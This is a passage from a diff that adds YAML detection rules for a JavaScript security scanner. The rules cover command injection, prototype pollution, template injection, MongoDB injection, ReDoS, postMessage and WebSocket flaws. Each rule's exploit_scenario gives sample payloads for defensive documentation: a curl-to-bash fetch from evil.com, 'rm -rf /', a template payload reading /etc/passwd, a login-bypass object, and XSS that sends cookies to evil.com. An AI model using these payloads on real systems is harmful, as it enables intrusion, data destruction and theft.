+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Arbitrary OS command execution with Node.js process privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.host, req.query.filename"
+        sink: "exec(), execSync()"
+        through: "string concatenation or template literal"
+    impact: |
+      Arbitrary OS command execution enabling full server compromise, data
+      exfiltration, lateral movement, ransomware deployment, and persistent
+      backdoor installation.
+    remediation: |
+      - Use execFile() or spawn() without shell:true for safe execution.
+      - Pass arguments as arrays, never as concatenated strings.
+      - Validate input against strict allowlists.
+      - Use shell-escape or shell-quote library for unavoidable shell usage.
+    references:
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://nodejs.org/api/child_process.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]child_process[\x27"]\s*\)', 'import.*child_process']
+      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params', 'process\.argv']
+      taint_sink_indicators: ['exec\s*\(', 'execSync\s*\(', 'spawn\s*\(']
+      sanitization_patterns: ['execFile', 'shell-escape', 'shell-quote', 'allowlist']
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An image processing API runs exec('convert ' + req.body.filename + ' output.png').
+        Attacker sends filename="; rm -rf / #" to execute destructive commands.
+      example_payload: "test.png; curl https://evil.com/shell.sh | bash"
+      attacker_objective: "Execute arbitrary OS commands via command injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-002, JS-INJ-006]
+
+  # ==========================================================================
+  # JS-INJ-008: Prototype Pollution via Merge/Extend
+  # ==========================================================================
+  - rule_id: JS-INJ-008
+    title: Prototype Pollution via Object Merge/Extend
+    description: >
+      Detects prototype pollution vulnerabilities where user-controlled objects
+      are merged into application objects using recursive merge, deep extend, or
+      Object.assign patterns. Attackers can inject __proto__, constructor, or
+      prototype properties to modify Object.prototype, affecting all objects.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.88
+    cwe: CWE-1321
+    owasp: "A03:2021-Injection"
+    tags: [prototype-pollution, merge, extend, javascript, object-injection]
+    detection_layer: 3
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '(?:merge|extend|assign|defaults|deepMerge|deepExtend)\s*\([^)]*(?:req\.|request\.|body|query|params|input|user|data)\.'
+        description: "Deep merge with user-controlled object"
+      - type: regex
+        pattern: 'Object\.assign\s*\(\s*(?:\{\}|target|defaults|config)\s*,\s*(?:req\.|request\.|body|query|params|input|user)'
+        description: "Object.assign with user-controlled source"
+      - type: regex
+        pattern: '(?:lodash|_)\s*\.(?:merge|mergeWith|defaultsDeep|assign)\s*\([^)]*(?:req|request|body|query|params|input|user)'
+        description: "Lodash merge with user-controlled input"
+      - type: regex
+        pattern: '(?:hoek|qs|deep-extend|merge-deep|deepmerge)\s*\.(?:merge|applyToDefaults)\s*\([^)]*(?:req|input|user)'
+        description: "Third-party deep merge with user input"
+    anti_patterns:
+      - 'Object\.freeze\s*\('
+      - 'Object\.create\s*\(\s*null\s*\)'
+      - '__proto__.*delete'
+      - 'hasOwnProperty'
+      - 'sanitize'
+      - 'Object\.keys\s*\('
+      - 'JSON\.parse\s*\(\s*JSON\.stringify'
+    bypass_variants:
+      - description: "Pollution via __proto__ key"
+        pattern: '__proto__'
+      - description: "Pollution via constructor.prototype"
+        pattern: 'constructor\.prototype'
+    evasion_indicators:
+      - "__proto__ key in user JSON"
+      - "constructor.prototype chain"
+      - "Nested object with prototype keys"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: '\\u005f\\u005fproto\\u005f\\u005f'
+      - type: "mixed_case"
+        pattern: '__Proto__'
+    multi_function_chain_patterns:
+      - "req.body (JSON with __proto__) -> _.merge(defaults, body)"
+      - "req.query -> qs.parse -> Object.assign(config, parsed)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Prototype pollution can lead to RCE, authentication bypass, and DoS"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body (JSON)"
+        sink: "_.merge(), Object.assign()"
+        through: "__proto__ key in parsed JSON"
+    impact: |
+      Prototype pollution can modify behavior of all JavaScript objects,
+      enabling RCE (via gadget chains), authentication bypass, XSS, and DoS.
+    remediation: |
+      - Use Object.create(null) for dictionary objects.
+      - Freeze prototypes with Object.freeze(Object.prototype).
+      - Use Map instead of plain objects for user-controlled keys.
+      - Validate and strip __proto__, constructor, prototype keys from input.
+    references:
+      - "https://cwe.mitre.org/data/definitions/1321.html"
+      - "https://portswigger.net/web-security/prototype-pollution"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]lodash[\x27"]\s*\)', 'Object\.assign']
+      taint_source_indicators: ['req\.body', 'req\.query', 'JSON\.parse']
+      taint_sink_indicators: ['\.merge\s*\(', '\.extend\s*\(', 'Object\.assign']
+      sanitization_patterns: ['Object\.freeze', 'hasOwnProperty', '__proto__.*filter']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * gadget_availability"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An Express app merges user settings with defaults via _.merge(defaults, req.body).
+        Attacker sends {"__proto__":{"isAdmin":true}} to pollute all objects with isAdmin=true.
+      example_payload: '{"__proto__":{"isAdmin":true,"role":"admin"}}'
+      attacker_objective: "Modify Object.prototype to bypass security checks"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-002, JS-INJ-014]
+
+  # ==========================================================================
+  # JS-INJ-009: Server-Side Template Injection (EJS/Pug/Handlebars)
+  # ==========================================================================
+  - rule_id: JS-INJ-009
+    title: Server-Side Template Injection (SSTI)
+    description: >
+      Detects SSTI vulnerabilities in Node.js template engines (EJS, Pug,
+      Handlebars, Nunjucks) where user-controlled input is used as template
+      content rather than template data, enabling arbitrary code execution.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.91
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags: [ssti, template-injection, ejs, pug, handlebars, rce]
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'ejs\.render\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
+        description: "EJS render with user-controlled template"
+      - type: regex
+        pattern: 'pug\.render\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
+        description: "Pug render with user-controlled template"
+      - type: regex
+        pattern: 'Handlebars\.compile\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
+        description: "Handlebars compile with user-controlled template"
+      - type: regex
+        pattern: 'nunjucks\.renderString\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
+        description: "Nunjucks renderString with user-controlled template"
+      - type: regex
+        pattern: '\.render\s*\(\s*(?:req\.body|req\.query)\s*\.\s*(?:template|content|html|markup)\b'
+        description: "Generic template render with user template field"
+    anti_patterns:
+      - '\.render\s*\(\s*[\x27"][^${}]+[\x27"]\s*,'
+      - 'res\.render\s*\(\s*[\x27"]'
+      - 'sanitize'
+      - 'test\s*\('
+      - 'template\s*=\s*[\x27"][^${}]+[\x27"]'
+      - '\.renderFile\s*\('
+    bypass_variants:
+      - description: "EJS include directive injection"
+        pattern: '<%\s*include\s+.*%>'
+      - description: "EJS code block injection"
+        pattern: '<%[-=]?\s*.*require\s*\('
+    evasion_indicators:
+      - "Template syntax injection (<%= %>, {{ }}, #{ })"
+      - "Template directive injection"
+    encoding_variants:
+      - type: "html_entities"
+        pattern: '&lt;%.*%&gt;'
+      - type: "url_encoding"
+        pattern: '%3C%25.*%25%3E'
+    multi_function_chain_patterns:
+      - "req.body.template -> ejs.render(template, data)"
+      - "req.query.content -> nunjucks.renderString(content)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "SSTI enables RCE via template engine code execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.template"
+        sink: "ejs.render()"
+        through: "user-controlled template string"
+    impact: |
+      SSTI in Node.js template engines enables arbitrary code execution on the
+      server, leading to full system compromise, data exfiltration, and RCE.
+    remediation: |
+      - Never use user input as template content; only pass it as template data.
+      - Use res.render(viewName, {data}) with predefined template files.
+      - Enable sandboxed template execution where available.
+      - Use logic-less templates (Mustache) that don't support code execution.
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://portswigger.net/web-security/server-side-template-injection"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ejs[\x27"]\s*\)', 'require\s*\(\s*[\x27"]pug[\x27"]\s*\)']
+      taint_source_indicators: ['req\.body\.template', 'req\.query\.content']
+      taint_sink_indicators: ['\.render\s*\(', '\.compile\s*\(', '\.renderString\s*\(']
+      sanitization_patterns: ['res\.render\s*\(\s*[\x27"]', 'renderFile']
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A CMS allows custom email templates. The app uses ejs.render(req.body.template, data).
+        Attacker sends template=<%= process.mainModule.require('child_process').execSync('id') %>.
+      example_payload: "<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd') %>"
+      attacker_objective: "Achieve RCE through server-side template injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-002, JS-INJ-007]
+
+  # ==========================================================================
+  # JS-INJ-010: MongoDB NoSQL Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-010
+    title: MongoDB NoSQL Injection
+    description: >
+      Detects NoSQL injection in MongoDB queries where user-controlled input
+      is passed directly to MongoDB operators like $where, $regex, $gt, $ne,
+      enabling query manipulation, authentication bypass, and data exfiltration.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.90
+    cwe: CWE-943
+    owasp: "A03:2021-Injection"
+    tags: [nosql-injection, mongodb, query-injection, authentication-bypass]
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '\.find\s*\(\s*\{[^}]*(?:req\.|request\.|body|query|params|input|user)\.'
+        description: "MongoDB find with user-controlled query object"
+      - type: regex
+        pattern: '\.find(?:One)?\s*\(\s*(?:req\.|request\.)(?:body|query|params)'
+        description: "MongoDB find with entire request body as query"
+      - type: regex
+        pattern: '\$where\s*:\s*(?:req\.|request\.|body|query|params|input|user|function)'
+        description: "MongoDB $where with user-controlled JavaScript"
+      - type: regex
+        pattern: '\$(?:regex|gt|gte|lt|lte|ne|in|nin|or|and)\s*:\s*(?:req\.|request\.|body|query|params|input|user)\.'
+        description: "MongoDB operator with user-controlled value"
+      - type: regex
+        pattern: '\.(?:findOne|updateOne|deleteOne|aggregate)\s*\(\s*(?:req\.|request\.)(?:body|query)\b'
+        description: "MongoDB operation with direct request body"
+    anti_patterns:
+      - 'mongoose\.Schema'
+      - '\.sanitize\s*\('
+      - 'mongo-sanitize'
+      - 'express-mongo-sanitize'
+      - '\.validate\s*\('
+      - 'Joi\.'
+      - 'test\s*\('
+      - 'ObjectId\s*\('
+    bypass_variants:
+      - description: "Operator injection via JSON body"
+        pattern: '\\$(?:gt|ne|regex)\s*:'
+      - description: "$where JavaScript injection"
+        pattern: '\\$where\s*:\s*[\x27"].*(?:sleep|this\.)'
+    evasion_indicators:
+      - "MongoDB operator injection in JSON body"
+      - "$where JavaScript code execution"
+      - "$regex with ReDoS patterns"
+    encoding_variants:
+      - type: "unicode"
+        pattern: '\\u0024where'
+      - type: "url_encoding"
+        pattern: '%24where'
+    multi_function_chain_patterns:
+      - "req.body -> db.collection.find(req.body)"
+      - "req.query -> { username: req.query.user, password: req.query.pass }"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "NoSQL injection enables authentication bypass and data exfiltration"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body"
+        sink: "db.collection.find()"
+        through: "direct body pass as query object"
+    impact: |
+      NoSQL injection allows attackers to bypass authentication, extract data,
+      modify queries, and potentially execute server-side JavaScript via $where.
+    remediation: |
+      - Use express-mongo-sanitize middleware.
+      - Validate input types strictly (expect string, reject objects).
+      - Never pass raw request body/query to MongoDB operations.
+      - Use MongoDB parameterized queries and avoid $where.
+    references:
+      - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]mongodb[\x27"]\s*\)', 'mongoose\.']
+      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
+      taint_sink_indicators: ['\.find\s*\(', '\.findOne\s*\(', '\.aggregate\s*\(', '\\$where']
+      sanitization_patterns: ['mongo-sanitize', 'ObjectId\s*\(', 'Joi\.', 'validate']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A login endpoint uses db.users.findOne({username: req.body.username, password: req.body.password}).
+        Attacker sends {"username":"admin","password":{"$ne":""}} to bypass authentication.
+      example_payload: '{"username":"admin","password":{"$gt":""}}'
+      attacker_objective: "Bypass authentication or extract data via MongoDB operator injection"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-006, JS-INJ-014]
+
+  # ==========================================================================
+  # JS-INJ-011: RegExp Constructor ReDoS Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-011
+    title: RegExp Constructor ReDoS Injection
+    description: >
+      Detects usage of the RegExp constructor with user-controlled patterns,
+      enabling Regular Expression Denial of Service (ReDoS) attacks. Attackers
+      can craft patterns with exponential backtracking complexity.
+    language: javascript
+    category: injection
+    severity: Medium
+    confidence: 0.87
+    cwe: CWE-1333
+    owasp: "A03:2021-Injection"
+    tags: [redos, regex-injection, dos, javascript]
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'new\s+RegExp\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|search|pattern|filter)'
+        description: "RegExp constructor with user-controlled pattern"
+      - type: regex
+        pattern: 'new\s+RegExp\s*\(\s*[`][^`]*\$\{[^}]*(?:req|input|user|search|pattern)[^}]*\}'
+        description: "RegExp with template literal user input"
+      - type: regex
+        pattern: 'new\s+RegExp\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|input|user|search|pattern)'
+        description: "RegExp with concatenated user input"
+      - type: regex
+        pattern: '\.match\s*\(\s*new\s+RegExp\s*\(\s*(?:req|input|user|search|query)'
+        description: "String.match with user-controlled RegExp"
+    anti_patterns:
+      - 'new\s+RegExp\s*\(\s*[\x27"][^${}]+[\x27"]\s*\)'
+      - 'escapeRegExp'
+      - 'escape-string-regexp'
+      - 'lodash\.escapeRegExp'
+      - 'test\s*\('
+      - 'safe-regex'
+    bypass_variants:
+      - description: "Catastrophic backtracking pattern"
+        pattern: '\(a+\)\+'
+      - description: "Nested quantifiers"
+        pattern: '\([^)]*[+*]\s*\)[+*]'
+    evasion_indicators:
+      - "User-controlled regex with nested quantifiers"
+      - "Exponential backtracking patterns"
+    encoding_variants:
+      - type: "unicode"
+        pattern: '\\u[0-9a-fA-F]{4}'
+    multi_function_chain_patterns:
+      - "req.query.search -> new RegExp(search) -> str.match(regex)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "ReDoS causes CPU exhaustion and application denial of service"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query.search"
+        sink: "new RegExp()"
+        through: "direct parameter pass"
+    impact: |
+      ReDoS attacks cause CPU exhaustion, making the application unresponsive.
+      Attackers can craft patterns that take exponential time to evaluate.
+    remediation: |
+      - Escape user input with escapeRegExp before using in RegExp constructor.
+      - Use re2 library for safe regex evaluation.
+      - Set timeouts on regex operations.
+      - Use safe-regex to validate patterns before execution.
+    references:
+      - "https://cwe.mitre.org/data/definitions/1333.html"
+    context_awareness:
+      surrounding_context_patterns: ['\.match\s*\(', '\.test\s*\(', '\.replace\s*\(']
+      taint_source_indicators: ['req\.query\.search', 'req\.body\.pattern']
+      taint_sink_indicators: ['new\s+RegExp', '\.match\s*\(', '\.test\s*\(']
+      sanitization_patterns: ['escapeRegExp', 'escape-string-regexp', 'safe-regex']
+    severity_scoring:
+      severity_weight: 6
+      risk_score_formula_hint: "severity_weight * confidence * pattern_complexity"
+      exploitability_score: "Medium"
+    exploit_scenario:
+      attack_example: |
+        A search API uses new RegExp(req.query.q) to filter results. Attacker
+        sends q=(a+)+$ with a long input to cause catastrophic backtracking.
+      example_payload: "(a+)+$"
+      attacker_objective: "Cause denial of service via regex CPU exhaustion"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "medium"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: false
+      requires_ai_validation: true
+      high_impact_flag: false
+      related_rules: [JS-INJ-010]
+
+  # ==========================================================================
+  # JS-INJ-012: postMessage Origin Bypass
+  # ==========================================================================
+  - rule_id: JS-INJ-012
+    title: postMessage Origin Bypass Injection
+    description: >
+      Detects insecure postMessage handling where the origin of incoming
+      messages is not validated, allowing cross-origin attackers to inject
+      malicious data or trigger unauthorized actions.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.86
+    cwe: CWE-346
+    owasp: "A03:2021-Injection"
+    tags: [postmessage, origin-bypass, cross-origin, xss, javascript]
+    detection_layer: 3
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'addEventListener\s*\(\s*[\x27"]message[\x27"]\s*,\s*(?:function|(?:\w+|\([^)]*\))\s*=>)\s*(?:\{|\()'
+        description: "Message event listener without origin check"
+      - type: regex
+        pattern: 'onmessage\s*=\s*(?:function|(?:\w+|\([^)]*\))\s*=>)'
+        description: "onmessage handler assignment"
+      - type: regex
+        pattern: '\.postMessage\s*\(\s*[^,]+,\s*[\x27"]\*[\x27"]\s*\)'
+        description: "postMessage with wildcard target origin"
+      - type: regex
+        pattern: 'event\.data(?!\s*&&\s*event\.origin)'
+        description: "Using event.data without prior origin check"
+    anti_patterns:
+      - 'event\.origin\s*(?:===|!==|==|!=)'
+      - 'if\s*\(\s*(?:e|event|msg)\.origin'
+      - 'allowedOrigins'
+      - 'trustedOrigins'
+      - 'ALLOWED_ORIGINS'
+      - 'test\s*\('
+    bypass_variants:
+      - description: "Postmessage via null origin sandbox"
+        pattern: 'sandbox\s*=\s*[\x27"]allow-scripts[\x27"]'
+      - description: "Origin check bypass via data: scheme"
+        pattern: 'origin\s*===\s*[\x27"]null[\x27"]'
+    evasion_indicators:
+      - "Sandboxed iframe with null origin"
+      - "data: URI origin bypass"
+    encoding_variants:
+      - type: "json_injection"
+        pattern: 'JSON\.parse\s*\(\s*(?:e|event)\.data\s*\)'
+    multi_function_chain_patterns:
+      - "window.postMessage(payload, '*') -> event.data -> eval/innerHTML"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Cross-origin message injection enables XSS and action forgery"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "event.data (postMessage)"
+        sink: "innerHTML, eval, or DOM manipulation"
+        through: "missing origin validation"
+    impact: |
+      Missing postMessage origin validation allows cross-origin attackers to
+      inject data, trigger XSS, forge actions, and steal sensitive information.
+    remediation: |
+      - Always validate event.origin against a strict allowlist.
+      - Never use '*' as the target origin in postMessage().
+      - Validate and sanitize event.data before processing.
+    references:
+      - "https://cwe.mitre.org/data/definitions/346.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
+    context_awareness:
+      surrounding_context_patterns: ['addEventListener', 'postMessage', 'window\.']
+      taint_source_indicators: ['event\.data', 'e\.data', 'msg\.data']
+      taint_sink_indicators: ['innerHTML', 'eval', 'document\.write']
+      sanitization_patterns: ['event\.origin', 'allowedOrigins', 'origin\s*===']
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (1 - origin_check)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A widget handles postMessage events without origin checks and uses
+        event.data to update innerHTML. An attacker hosts a page that sends
+        malicious postMessage with XSS payload to the widget iframe.
+      example_payload: '<img src=x onerror="alert(document.cookie)">'
+      attacker_objective: "Inject malicious data via cross-origin postMessage"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-001, JS-INJ-013]
+
+  # ==========================================================================
+  # JS-INJ-013: WebSocket Message Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-013
+    title: WebSocket Message Injection
+    description: >
+      Detects insecure handling of WebSocket messages where incoming data is
+      used without validation in security-sensitive operations like eval,
+      innerHTML, or database queries.
+    language: javascript
+    category: injection
+    severity: High
+    confidence: 0.85
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags: [websocket, message-injection, real-time, javascript]
+    detection_layer: 3
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'ws\.on\s*\(\s*[\x27"]message[\x27"]\s*,\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:eval|innerHTML|exec|query)\s*'
+        description: "WebSocket message handler with dangerous sink"
+      - type: regex
+        pattern: '\.onmessage\s*=\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:eval|innerHTML|document\.write)'
+        description: "WebSocket onmessage with XSS/eval sink"
+      - type: regex
+        pattern: 'socket\.on\s*\(\s*[\x27"]\w+[\x27"]\s*,\s*(?:function|\([^)]*\)\s*=>)\s*\{[^}]*(?:exec|query|eval)'
+        description: "Socket.io event handler with dangerous operation"
+      - type: regex
+        pattern: 'JSON\.parse\s*\(\s*(?:msg|message|data|event\.data)\s*\)[^;]*(?:eval|exec|query|innerHTML)'
+        description: "Parsed WebSocket message used in dangerous sink"
+    anti_patterns:
+      - 'validate\s*\('
+      - 'sanitize\s*\('
+      - 'schema\s*\.\s*validate'
+      - 'Joi\.'
+      - 'test\s*\('
+      - 'JSON\.parse.*try.*catch'
+    bypass_variants:
+      - description: "Binary WebSocket message injection"
+        pattern: 'ws\.binaryType\s*=\s*[\x27"]arraybuffer[\x27"]'
+      - description: "Multiple event handler injection"
+        pattern: 'socket\.on\s*\(\s*[^)]+\)\s*;?\s*socket\.on'
+    evasion_indicators:
+      - "Binary data in WebSocket messages"
+      - "Race condition in multi-message protocols"
+    encoding_variants:
+      - type: "json_injection"
+        pattern: 'JSON\.parse\s*\(\s*message\s*\)'
+    multi_function_chain_patterns:
+      - "WebSocket message -> JSON.parse -> eval(msg.code)"
+      - "Socket.io event -> message.data -> db.query()"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "WebSocket injection enables real-time code execution and data theft"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "WebSocket message data"
+        sink: "eval(), innerHTML, db.query()"
+        through: "JSON.parse and direct usage"
+    impact: |
+      WebSocket message injection can lead to code execution, XSS, SQL
+      injection, and unauthorized data manipulation in real-time applications.
+    remediation: |
+      - Validate and sanitize all WebSocket message data.
+      - Use schema validation (Joi, ajv) for message formats.
+      - Never use eval() or innerHTML with WebSocket data.
+      - Implement message authentication (HMAC signatures).
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+    context_awareness:
+      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ws[\x27"]\s*\)', 'require\s*\(\s*[\x27"]socket\.io[\x27"]\s*\)']
+      taint_source_indicators: ['msg', 'message', 'data', 'event\.data']
+      taint_sink_indicators: ['eval\s*\(', 'innerHTML', '\.query\s*\(', 'exec']
+      sanitization_patterns: ['validate', 'Joi\.', 'schema\.validate', 'sanitize']
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 - validation_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A chat app renders WebSocket messages via element.innerHTML = msg.content.
+        Attacker sends a message containing <script>document.location='https://evil.com/'+document.cookie</script>.
+      example_payload: '<img src=x onerror="fetch(`https://evil.com/?c=${document.cookie}`)">'
+      attacker_objective: "Inject malicious content via WebSocket messages"
+    confidence_factors:
+      pattern_strength: "medium"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [JS-INJ-001, JS-INJ-012]
+
+  # ==========================================================================
+  # JS-INJ-014: Express Body Parser Injection
+  # ==========================================================================
+  - rule_id: JS-INJ-014
+    title: Express Middleware Body Parser Injection
+    description: >
+      Detects insecure Express.js middleware configurations that allow
+      body parser type confusion attacks, enabling attackers to send
+      unexpected content types that bypass validation logic.
+    language: javascript
+    category: injection
+    severity: Medium
+    confidence: 0.84
+    cwe: CWE-20
+    owasp: "A03:2021-Injection"
+    tags: [express, body-parser, type-confusion, middleware, content-type]
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'app\.use\s*\(\s*(?:express\.json|bodyParser\.json)\s*\(\s*\{[^}]*(?:strict\s*:\s*false|type\s*:\s*[\x27"]\*)'
+        description: "JSON body parser with relaxed strict or type settings"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*(?:express\.urlencoded|bodyParser\.urlencoded)\s*\(\s*\{[^}]*extended\s*:\s*true'
+        description: "URL-encoded parser with extended mode allowing nested objects"
+      - type: regex
+        pattern: 'app\.use\s*\(\s*(?:express\.raw|bodyParser\.raw)\s*\(\s*\{[^}]*type\s*:\s*[\x27"]\*'
+        description: "Raw body parser accepting all content types"
+      - type: regex
+        pattern: 'bodyParser\.text\s*\(\s*\{[^}]*type\s*:\s*[\x27"]\*/\*'
+        description: "Text body parser accepting all MIME types"
+    anti_patterns:
+      - 'extended\s*:\s*false'
+      - 'strict\s*:\s*true'
+      - 'type\s*:\s*[\x27"]application/json[\x27"]'
+      - 'helmet\s*\('
+      - 'test\s*\('
+      - 'content-type.*validation'
+    bypass_variants:
+      - description: "Content-Type mismatch attack"
+        pattern: 'Content-Type:\s*(?:text/plain|application/x-www-form-urlencoded).*\{'
+      - description: "HPP via extended urlencoded"
+        pattern: 'extended\s*:\s*true.*\w+\[__proto__\]'
+    evasion_indicators:
+      - "Content-Type header manipulation"
+      - "Nested object injection via extended urlencoded"
+    encoding_variants:
+      - type: "content_type_confusion"
+        pattern: 'Content-Type:\s*(?!application/json)'
+    multi_function_chain_patterns:
+      - "bodyParser.urlencoded({extended:true}) -> req.body -> prototype pollution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Body parser misconfiguration enables type confusion and prototype pollution"
+    business_logic_indicator:
+      financial_impact: false
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body"
+        sink: "req.body"
+        through: "body parser with extended:true or relaxed type"
+    impact: |
+      Insecure body parser configuration enables type confusion attacks,
+      prototype pollution via extended urlencoded, and content-type bypass.
+    remediation: |
+      - Use extended: false for urlencoded parser.
+      - Set explicit content type restrictions.
+      - Validate req.body types explicitly in route handlers.
